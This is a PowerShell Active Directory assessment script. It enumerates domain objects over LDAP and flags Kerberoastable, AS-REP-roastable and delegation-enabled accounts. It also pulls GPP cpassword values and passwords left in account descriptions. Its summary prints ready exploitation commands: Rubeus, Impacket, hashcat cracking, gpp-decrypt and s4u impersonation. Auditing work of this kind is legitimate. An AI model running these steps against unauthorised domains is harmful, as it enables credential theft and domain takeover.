# Script: ldapsearch-ng.ps1
# Active Directory Security Assessment Tool - Version 3.0
# Complete LDAP enumeration with vulnerability detection and exploitation guides

param(
    [Parameter(Mandatory=$true)][string]$Server,
    [Parameter(Mandatory=$true)][string]$Domain,
    [Parameter(Mandatory=$true)][string]$Usuario,
    [Parameter(Mandatory=$true)][string]$Password,
    [switch]$Users,[switch]$Groups,[switch]$Computers,[switch]$GPOs,
    [switch]$ServiceAccounts,[switch]$Kerberoast,[switch]$ASREPRoast,
    [switch]$DomainAdmins,[switch]$Vulnerabilities,[switch]$All
)

$script:StartTime = Get-Date
$script:CriticalIssues = 0
$script:WarningIssues = 0
$script:Findings = @{
    Kerberoastable=@();ASREPRoastable=@();UnconstrainedDelegation=@()
    ConstrainedDelegation=@();PasswordInDescription=@();PasswordNeverExpires=@()
    UnlinkedGPOs=@();cPasswordFound=@();AdminCountUsers=@();OldPasswords=@()
    PrivilegedServiceAccounts=@()
}

Write-Host "`n==================================================================================================" -ForegroundColor Cyan
Write-Host "                    ACTIVE DIRECTORY SECURITY ASSESSMENT TOOL v3.0" -ForegroundColor Cyan
Write-Host "==================================================================================================" -ForegroundColor Cyan
Write-Host "[*] Target: $Server | Domain: $Domain | User: $Usuario" -ForegroundColor Yellow
Write-Host "[*] Start Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor Yellow
Write-Host "==================================================================================================" -ForegroundColor Cyan

$domainDN = "DC=" + ($Domain -replace "\.", ",DC=")
$ldapPath = "LDAP://$Server/$domainDN"

try {
    $domainEntry = New-Object System.DirectoryServices.DirectoryEntry($ldapPath,"$Domain\$Usuario",$Password)
    $null = $domainEntry.name
    Write-Host "[+] LDAP Connection Successful" -ForegroundColor Green
} catch {
    Write-Host "[-] CRITICAL: LDAP Connection Error: $_" -ForegroundColor Red
    Write-Host "[*] Test: Test-NetConnection -ComputerName $Server -Port 389" -ForegroundColor Yellow
    exit 1
}

function Get-DomainUsers {
    Write-Host "`n========== DOMAIN USERS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(objectCategory=person))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","name","description"))
    $results = $searcher.FindAll()
    Write-Host "[+] Total Users: $($results.Count)" -ForegroundColor Green
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $name = if($r.Properties["name"].Count -gt 0){$r.Properties["name"][0]}else{"N/A"}
        Write-Host "  [+] $sam - $name" -ForegroundColor White
    }
    $results.Dispose()
}

function Get-DomainGroups {
    Write-Host "`n========== DOMAIN GROUPS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(objectClass=group)"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","name"))
    $results = $searcher.FindAll()
    Write-Host "[+] Total Groups: $($results.Count)" -ForegroundColor Green
    foreach ($r in $results) {
        Write-Host "  [+] $($r.Properties["samaccountname"][0])" -ForegroundColor White
    }
    $results.Dispose()
}

function Get-DomainComputers {
    Write-Host "`n========== DOMAIN COMPUTERS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(objectClass=computer)"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("name","dnshostname","operatingsystem"))
    $results = $searcher.FindAll()
    Write-Host "[+] Total Computers: $($results.Count)" -ForegroundColor Green
    foreach ($r in $results) {
        $name = $r.Properties["name"][0]
        $dns = if($r.Properties["dnshostname"].Count -gt 0){$r.Properties["dnshostname"][0]}else{"N/A"}
        $os = if($r.Properties["operatingsystem"].Count -gt 0){$r.Properties["operatingsystem"][0]}else{"N/A"}
        Write-Host "  [+] $name ($dns) - $os" -ForegroundColor White
    }
    $results.Dispose()
}

function Get-DomainGPOs {
    Write-Host "`n========== GROUP POLICY OBJECTS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(objectClass=groupPolicyContainer)"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("displayname","name","gpcfilesyspath","whenCreated","distinguishedName"))
    $results = $searcher.FindAll()
    if($results.Count -eq 0){Write-Host "[-] No GPOs found" -ForegroundColor Yellow;return}
    Write-Host "[+] Total GPOs: $($results.Count)" -ForegroundColor Green
    
    $gpoCounter = 0
    foreach ($r in $results) {
        $gpoCounter++
        $displayName = $r.Properties["displayname"][0]
        $gpoGuid = $r.Properties["name"][0]
        $gpoPath = $r.Properties["gpcfilesyspath"][0]
        $created = $r.Properties["whencreated"][0]
        
        # CORRECCION: Usar ${} para delimitar la variable
        Write-Host "`n--- GPO #${gpoCounter} - $displayName ---" -ForegroundColor Green
        Write-Host "  GUID: $gpoGuid" -ForegroundColor Gray
        Write-Host "  Path: $gpoPath" -ForegroundColor Gray
        Write-Host "  Created: $created" -ForegroundColor Gray
        
        $ouSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
        $ouSearcher.Filter = "(gPLink=*$gpoGuid*)"
        $ouSearcher.PageSize = 1000
        $ouSearcher.PropertiesToLoad.AddRange(@("distinguishedName","name"))
        $linkedOUs = $ouSearcher.FindAll()
        
        if($linkedOUs.Count -gt 0) {
            Write-Host "  [+] Linked to $($linkedOUs.Count) OU(s)" -ForegroundColor Green
            $totalComp=0;$totalUsers=0;$totalGroups=0
            
            foreach ($ou in $linkedOUs) {
                $ouName = $ou.Properties["name"][0]
                $ouDN = $ou.Properties["distinguishedname"][0]
                Write-Host "    - OU: $ouName" -ForegroundColor White
                
                $compSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
                $compSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Server/$ouDN")
                $compSearcher.Filter = "(objectClass=computer)"
                $compSearcher.PropertiesToLoad.AddRange(@("name","dnshostname","operatingSystem"))
                $computers = $compSearcher.FindAll()
                $compCount = $computers.Count
                $totalComp += $compCount
                
                if($compCount -gt 0) {
                    Write-Host "      Computers: $compCount" -ForegroundColor Cyan
                    foreach ($c in $computers | Select-Object -First 3) {
                        $cName = $c.Properties["name"][0]
                        $cOS = if($c.Properties["operatingsystem"].Count -gt 0){$c.Properties["operatingsystem"][0]}else{"N/A"}
                        Write-Host "        - $cName - $cOS" -ForegroundColor Gray
                    }
                    if($compCount -gt 3){Write-Host "        ... and $($compCount-3) more" -ForegroundColor Gray}
                }
                
                $userSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
                $userSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Server/$ouDN")
                $userSearcher.Filter = "(&(objectClass=user)(objectCategory=person))"
                $userSearcher.PropertiesToLoad.AddRange(@("samaccountname","name","memberOf"))
                $users = $userSearcher.FindAll()
                $userCount = $users.Count
                $totalUsers += $userCount
                
                if($userCount -gt 0) {
                    Write-Host "      Users: $userCount" -ForegroundColor Cyan
                    foreach ($u in $users | Select-Object -First 3) {
                        $uName = $u.Properties["samaccountname"][0]
                        Write-Host "        - $uName" -ForegroundColor Gray
                        $memberOf = $u.Properties["memberof"]
                        foreach ($g in $memberOf) {
                            if($g -match "Domain Admins|Enterprise Admins|Administrators") {
                                Write-Host "          [!] PRIVILEGED: $(($g -split ',')[0] -replace 'CN=')" -ForegroundColor Red
                                $script:CriticalIssues++
                            }
                        }
                    }
                    if($userCount -gt 3){Write-Host "        ... and $($userCount-3) more" -ForegroundColor Gray}
                }
                
                $groupSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
                $groupSearcher.SearchRoot = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$Server/$ouDN")
                $groupSearcher.Filter = "(objectClass=group)"
                $groupSearcher.PropertiesToLoad.AddRange(@("samaccountname","member"))
                $groups = $groupSearcher.FindAll()
                $groupCount = $groups.Count
                $totalGroups += $groupCount
                
                if($groupCount -gt 0) {
                    Write-Host "      Groups: $groupCount" -ForegroundColor Cyan
                    foreach ($grp in $groups | Select-Object -First 3) {
                        $gName = $grp.Properties["samaccountname"][0]
                        $memCount = if($grp.Properties["member"].Count -gt 0){$grp.Properties["member"].Count}else{0}
                        Write-Host "        - $gName (Members: $memCount)" -ForegroundColor Gray
                    }
                }
            }
            Write-Host "  [+] TOTAL AFFECTED: Computers=$totalComp | Users=$totalUsers | Groups=$totalGroups" -ForegroundColor Green
        } else {
            Write-Host "  [-] CRITICAL: GPO not linked - NO EFFECT" -ForegroundColor Red
            $script:CriticalIssues++
            $script:Findings.UnlinkedGPOs += @{Name=$displayName;GUID=$gpoGuid}
        }
        
        if($gpoPath) {
            try {
                if(Test-Path $gpoPath -ErrorAction Stop) {
                    Write-Host "  [+] SYSVOL accessible" -ForegroundColor Green
                    $groupsXml = Get-ChildItem $gpoPath -Recurse -Filter "Groups.xml" -ErrorAction SilentlyContinue
                    if($groupsXml) {
                        Write-Host "  [!] CRITICAL: Groups.xml found - cPassword vulnerability" -ForegroundColor Red
                        $script:CriticalIssues++
                        foreach ($xml in $groupsXml) {
                            $xmlContent = Get-Content $xml.FullName -ErrorAction SilentlyContinue
                            if($xmlContent -match 'cpassword="([^"]+)"') {
                                $cpassHash = $Matches[1]
                                Write-Host "    [!] cPassword FOUND: $cpassHash" -ForegroundColor Red
                                $script:Findings.cPasswordFound += @{GPO=$displayName;Hash=$cpassHash;File=$xml.FullName}
                            }
                        }
                    }
                }
            } catch {
                Write-Host "  [-] ERROR: Cannot access SYSVOL" -ForegroundColor Red
                $script:CriticalIssues++
            }
        }
    }
    $results.Dispose()
}

function Get-ServiceAccounts {
    Write-Host "`n========== SERVICE ACCOUNTS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(|(samaccountname=*svc*)(samaccountname=*service*)(samaccountname=*sql*)(description=*service*)))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","description","serviceprincipalname","memberof","pwdlastset","useraccountcontrol"))
    $results = $searcher.FindAll()
    if($results.Count -eq 0){Write-Host "[-] No service accounts found" -ForegroundColor Yellow;return}
    Write-Host "[+] Service Accounts: $($results.Count)" -ForegroundColor Green
    
    $svcCounter = 0
    foreach ($r in $results) {
        $svcCounter++
        $sam = $r.Properties["samaccountname"][0]
        $desc = if($r.Properties["description"].Count -gt 0){$r.Properties["description"][0]}else{"N/A"}
        $spns = $r.Properties["serviceprincipalname"]
        $pwdLastSet = $r.Properties["pwdlastset"][0]
        $uac = $r.Properties["useraccountcontrol"][0]
        $groups = $r.Properties["memberof"]
        
        # CORRECCION: Usar ${} para delimitar la variable
        Write-Host "`n--- SERVICE #${svcCounter} - $sam ---" -ForegroundColor Green
        Write-Host "  Description: $desc" -ForegroundColor Gray
        
        if($pwdLastSet) {
            $pwdDate = [DateTime]::FromFileTime($pwdLastSet)
            $pwdAge = (Get-Date) - $pwdDate
            Write-Host "  Password Age: $($pwdAge.Days) days" -ForegroundColor Gray
            if($pwdAge.Days -gt 365) {
                Write-Host "  [!] CRITICAL: Very old password" -ForegroundColor Red
                $script:CriticalIssues++
                $script:Findings.OldPasswords += @{Account=$sam;Age=$pwdAge.Days}
            }
        }
        
        if($uac -band 0x10000) {
            Write-Host "  [!] CRITICAL: Password never expires" -ForegroundColor Red
            $script:CriticalIssues++
            $script:Findings.PasswordNeverExpires += @{Account=$sam}
        }
        if($uac -band 0x80000) {
            Write-Host "  [!] CRITICAL: Unconstrained delegation" -ForegroundColor Red
            $script:CriticalIssues++
            $script:Findings.UnconstrainedDelegation += @{Account=$sam}
        }
        if($uac -band 0x400000) {
            Write-Host "  [!] CRITICAL: No Kerberos pre-auth (ASREPRoastable)" -ForegroundColor Red
            $script:CriticalIssues++
            $script:Findings.ASREPRoastable += @{Account=$sam}
        }
        
        if($spns.Count -gt 0) {
            Write-Host "  [!] VULNERABLE: Kerberoastable - $($spns.Count) SPNs" -ForegroundColor Red
            foreach ($spn in $spns) {Write-Host "    - $spn" -ForegroundColor Cyan}
            $script:CriticalIssues++
            $script:Findings.Kerberoastable += @{Account=$sam;SPNs=$spns;PasswordAge=if($pwdLastSet){$pwdAge.Days}else{0}}
        }
        
        foreach ($g in $groups) {
            if($g -match "Domain Admins|Enterprise Admins|Administrators") {
                $gName = ($g -split ',')[0] -replace 'CN='
                Write-Host "  [!] CRITICAL: Privileged account - Member of $gName" -ForegroundColor Red
                $script:CriticalIssues++
                $script:Findings.PrivilegedServiceAccounts += @{Account=$sam;Group=$gName}
            }
        }
    }
    $results.Dispose()
}

function Get-Kerberoastable {
    Write-Host "`n========== KERBEROASTING ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(servicePrincipalName=*)(!samaccountname=krbtgt))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","serviceprincipalname","pwdlastset"))
    $results = $searcher.FindAll()
    if($results.Count -eq 0){Write-Host "[+] No Kerberoastable users" -ForegroundColor Green;return}
    Write-Host "[!] CRITICAL: $($results.Count) Kerberoastable user(s)" -ForegroundColor Red
    $script:CriticalIssues += $results.Count
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        $spns = $r.Properties["serviceprincipalname"]
        Write-Host "  [!] $sam - $($spns.Count) SPNs" -ForegroundColor Red
        if(-not ($script:Findings.Kerberoastable | Where-Object {$_.Account -eq $sam})) {
            $script:Findings.Kerberoastable += @{Account=$sam;SPNs=$spns}
        }
    }
    $results.Dispose()
}

function Get-ASREPRoastable {
    Write-Host "`n========== ASREPROASTING ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
    $searcher.PageSize = 1000
    $searcher.PropertiesToLoad.AddRange(@("samaccountname"))
    $results = $searcher.FindAll()
    if($results.Count -eq 0){Write-Host "[+] No ASREPRoastable users" -ForegroundColor Green;return}
    Write-Host "[!] CRITICAL: $($results.Count) ASREPRoastable user(s)" -ForegroundColor Red
    $script:CriticalIssues += $results.Count
    foreach ($r in $results) {
        $sam = $r.Properties["samaccountname"][0]
        Write-Host "  [!] $sam" -ForegroundColor Red
        if(-not ($script:Findings.ASREPRoastable | Where-Object {$_.Account -eq $sam})) {
            $script:Findings.ASREPRoastable += @{Account=$sam}
        }
    }
    $results.Dispose()
}

function Get-DomainAdmins {
    Write-Host "`n========== DOMAIN ADMINS ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(cn=Domain Admins)"
    $group = $searcher.FindOne()
    if($group) {
        $members = $group.Properties["member"]
        Write-Host "[+] Domain Admins: $($members.Count)" -ForegroundColor Green
        foreach ($memDN in $members) {
            $memSearcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
            $memSearcher.Filter = "(distinguishedName=$memDN)"
            $memSearcher.PropertiesToLoad.Add("samaccountname") | Out-Null
            $memResult = $memSearcher.FindOne()
            if($memResult) {Write-Host "  [+] $($memResult.Properties["samaccountname"][0])" -ForegroundColor Green}
        }
    }
}

function Get-Vulnerabilities {
    Write-Host "`n========== VULNERABILITIES ==========" -ForegroundColor Cyan
    $searcher = New-Object System.DirectoryServices.DirectorySearcher($domainEntry)
    $searcher.Filter = "(&(objectClass=user)(|(description=*password*)(description=*pwd*)(description=*pass*)))"
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","description"))
    $results = $searcher.FindAll()
    if($results.Count -gt 0) {
        Write-Host "[!] CRITICAL: $($results.Count) password(s) in descriptions" -ForegroundColor Red
        foreach ($r in $results) {
            $sam = $r.Properties["samaccountname"][0]
            $desc = $r.Properties["description"][0]
            Write-Host "  [!] $sam - $desc" -ForegroundColor Yellow
            $script:CriticalIssues++
            $script:Findings.PasswordInDescription += @{Account=$sam;Description=$desc}
        }
    }
    
    $searcher.Filter = "(&(objectClass=user)(msDS-AllowedToDelegateTo=*))"
    $searcher.PropertiesToLoad.Clear()
    $searcher.PropertiesToLoad.AddRange(@("samaccountname","msDS-AllowedToDelegateTo"))
    $results = $searcher.FindAll()
    if($results.Count -gt 0) {
        Write-Host "[!] $($results.Count) constrained delegation(s)" -ForegroundColor Red
        foreach ($r in $results) {
            $sam = $r.Properties["samaccountname"][0]
            $delegates = $r.Properties["msDS-AllowedToDelegateTo"]
            Write-Host "  [!] $sam -> $($delegates.Count) service(s)" -ForegroundColor Yellow
            $script:CriticalIssues++
            $script:Findings.ConstrainedDelegation += @{Account=$sam;Delegates=$delegates}
        }
    }
}

# EJECUTAR FUNCIONES
if($All -or $Users){Get-DomainUsers}
if($All -or $Groups){Get-DomainGroups}
if($All -or $Computers){Get-DomainComputers}
if($All -or $GPOs){Get-DomainGPOs}
if($All -or $ServiceAccounts){Get-ServiceAccounts}
if($All -or $Kerberoast){Get-Kerberoastable}
if($All -or $ASREPRoast){Get-ASREPRoastable}
if($All -or $DomainAdmins){Get-DomainAdmins}
if($All -or $Vulnerabilities){Get-Vulnerabilities}

# RESUMEN FINAL
Write-Host "`n`n==================================================================================================" -ForegroundColor Cyan
Write-Host "                              EXECUTIVE SUMMARY" -ForegroundColor Cyan
Write-Host "==================================================================================================" -ForegroundColor Cyan
Write-Host "Domain: $Domain | Server: $Server | Date: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor White
Write-Host "Critical Issues: $script:CriticalIssues | Warnings: $script:WarningIssues" -ForegroundColor $(if($script:CriticalIssues -gt 0){"Red"}else{"Green"})
Write-Host ""

if($script:Findings.Kerberoastable.Count -gt 0) {
    Write-Host "[1] KERBEROASTING - CRITICAL" -ForegroundColor Red
    Write-Host "    Affected: $($script:Findings.Kerberoastable.Count) accounts" -ForegroundColor Yellow
    foreach ($f in $script:Findings.Kerberoastable) {Write-Host "      - $($f.Account)" -ForegroundColor White}
    Write-Host "    Exploitation:" -ForegroundColor Cyan
    Write-Host "      .\Rubeus.exe kerberoast /outfile:hashes.txt" -ForegroundColor Green
    Write-Host "      GetUserSPNs.py $Domain/${Usuario}:$Password -dc-ip $Server -request" -ForegroundColor Green
    Write-Host "      hashcat -m 13100 hashes.txt rockyou.txt" -ForegroundColor Green
    Write-Host ""
}

if($script:Findings.ASREPRoastable.Count -gt 0) {
    Write-Host "[2] ASREPROASTING - CRITICAL" -ForegroundColor Red
    Write-Host "    Affected: $($script:Findings.ASREPRoastable.Count) accounts" -ForegroundColor Yellow
    foreach ($f in $script:Findings.ASREPRoastable) {Write-Host "      - $($f.Account)" -ForegroundColor White}
    Write-Host "    Exploitation:" -ForegroundColor Cyan
    Write-Host "      .\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt" -ForegroundColor Green
    Write-Host "      GetNPUsers.py $Domain/ -dc-ip $Server -request" -ForegroundColor Green
    Write-Host "      hashcat -m 18200 asrep.txt rockyou.txt" -ForegroundColor Green
    Write-Host ""
}

if($script:Findings.cPasswordFound.Count -gt 0) {
    Write-Host "[3] GPP cPASSWORD - CRITICAL" -ForegroundColor Red
    Write-Host "    Found: $($script:Findings.cPasswordFound.Count) cPassword(s)" -ForegroundColor Yellow
    foreach ($f in $script:Findings.cPasswordFound) {
        Write-Host "      GPO: $($f.GPO)" -ForegroundColor White
        Write-Host "      Hash: $($f.Hash)" -ForegroundColor Red
    }
    Write-Host "    Exploitation:" -ForegroundColor Cyan
    Write-Host "      gpp-decrypt '$($script:Findings.cPasswordFound[0].Hash)'" -ForegroundColor Green
    Write-Host ""
}

if($script:Findings.PasswordInDescription.Count -gt 0) {
    Write-Host "[4] PASSWORDS IN DESCRIPTIONS - CRITICAL" -ForegroundColor Red
    Write-Host "    Found: $($script:Findings.PasswordInDescription.Count)" -ForegroundColor Yellow
    foreach ($f in $script:Findings.PasswordInDescription) {
        Write-Host "      $($f.Account) - $($f.Description)" -ForegroundColor Red
    }
    Write-Host ""
}

if($script:Findings.UnconstrainedDelegation.Count -gt 0) {
    Write-Host "[5] UNCONSTRAINED DELEGATION - CRITICAL" -ForegroundColor Red
    Write-Host "    Affected: $($script:Findings.UnconstrainedDelegation.Count)" -ForegroundColor Yellow
    foreach ($f in $script:Findings.UnconstrainedDelegation) {Write-Host "      - $($f.Account)" -ForegroundColor White}
    Write-Host "    Exploitation:" -ForegroundColor Cyan
    Write-Host "      .\Rubeus.exe monitor /interval:5" -ForegroundColor Green
    Write-Host "      .\SpoolSample.exe DC01 COMPROMISED_SERVER" -ForegroundColor Green
    Write-Host ""
}

if($script:Findings.ConstrainedDelegation.Count -gt 0) {
    Write-Host "[6] CONSTRAINED DELEGATION - HIGH" -ForegroundColor Red
    Write-Host "    Affected: $($script:Findings.ConstrainedDelegation.Count)" -ForegroundColor Yellow
    foreach ($f in $script:Findings.ConstrainedDelegation) {Write-Host "      - $($f.Account)" -ForegroundColor White}
    Write-Host "    Exploitation:" -ForegroundColor Cyan
    Write-Host "      .\Rubeus.exe s4u /user:SVC /rc4:HASH /impersonateuser:Administrator /msdsspn:SPN /ptt" -ForegroundColor Green
    Write-Host ""
}

if($script:Findings.PrivilegedServiceAccounts.Count -gt 0) {
    Write-Host "[7] PRIVILEGED SERVICE ACCOUNTS - CRITICAL" -ForegroundColor Red
    Write-Host "    Affected: $($script:Findings.PrivilegedServiceAccounts.Count)" -ForegroundColor Yellow
    foreach ($f in $script:Findings.PrivilegedServiceAccounts) {
        Write-Host "      $($f.Account) -> $($f.Group)" -ForegroundColor Red
    }
    Write-Host ""
}

$overallRisk = if($script:CriticalIssues -gt 5){"CRITICAL"}elseif($script:CriticalIssues -gt 2){"HIGH"}elseif($script:CriticalIssues -gt 0){"MEDIUM"}else{"LOW"}
Write-Host "==================================================================================================" -ForegroundColor Cyan
Write-Host "OVERALL RISK LEVEL: $overallRisk" -ForegroundColor $(if($overallRisk -eq "CRITICAL" -or $overallRisk -eq "HIGH"){"Red"}elseif($overallRisk -eq "MEDIUM"){"Yellow"}else{"Green"})
Write-Host "==================================================================================================" -ForegroundColor Cyan
Write-Host "Scan Duration: $((Get-Date) - $script:StartTime)" -ForegroundColor Gray
Write-Host ""
Write-Host "[*] To save: .\ldapsearch3-ng.ps1 -Server $Server -Domain $Domain -Usuario $Usuario -Password 'PASS' -All > report.txt" -ForegroundColor Cyan
Write-Host ""

$global:ScanResults = @{Domain=$Domain;Server=$Server;ScanDate=Get-Date;Duration=(Get-Date)-$script:StartTime;CriticalIssues=$script:CriticalIssues;Warnings=$script:WarningIssues;Findings=$script:Findings;OverallRisk=$overallRisk}
Write-Host "[*] Results stored in: `$global:ScanResults" -ForegroundColor Green
